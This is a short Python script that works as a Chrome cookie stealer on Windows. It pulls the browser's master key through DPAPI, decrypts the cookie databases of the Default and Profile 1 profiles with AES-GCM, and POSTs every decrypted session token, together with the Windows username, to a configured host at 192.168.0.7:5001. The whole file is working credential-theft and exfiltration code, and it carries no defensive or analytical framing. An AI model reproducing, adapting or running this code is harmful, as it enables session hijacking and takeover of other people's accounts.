import os
import json
import base64
import sqlite3
import requests
import shutil
from Cryptodome.Cipher import AES
import win32crypt

# --- CONFIG ---
MAC_IP = "192.168.0.7" # YOUR MAC IP
EXFIL_URL = f"http://{MAC_IP}:5001/api/capture"

def get_master_key():
    path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def get_decrypted_cookies():
    key = get_master_key()
    user_data = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    profiles = ['Default', 'Profile 1']
    decrypted_data = []

    for profile in profiles:
        db_path = os.path.join(user_data, profile, 'Network', 'Cookies')
        if not os.path.exists(db_path): continue
        
        temp_db = os.path.join(os.environ["TEMP"], "decryption_temp.db")
        shutil.copy2(db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        for host, name, encrypted_val in cursor.fetchall():
            try:
                iv, payload = encrypted_val[3:15], encrypted_val[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                # This line turns the scrambled data into a real working session key
                decrypted_val = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                
                if decrypted_val:
                    decrypted_data.append({"domain": host, "name": name, "value": decrypted_val})
            except: continue
            
        conn.close()
        try: os.remove(temp_db)
        except: pass
        
    return decrypted_data

if __name__ == "__main__":
    print("[*] Unlocking local vault...")
    results = get_decrypted_cookies()
    if results:
        print(f"[SUCCESS] Decrypted {len(results)} WORKING tokens.")
        requests.post(EXFIL_URL, json={"user": os.getlogin(), "tokens": results})
        print("[!] Data transmitted to MacBook.")
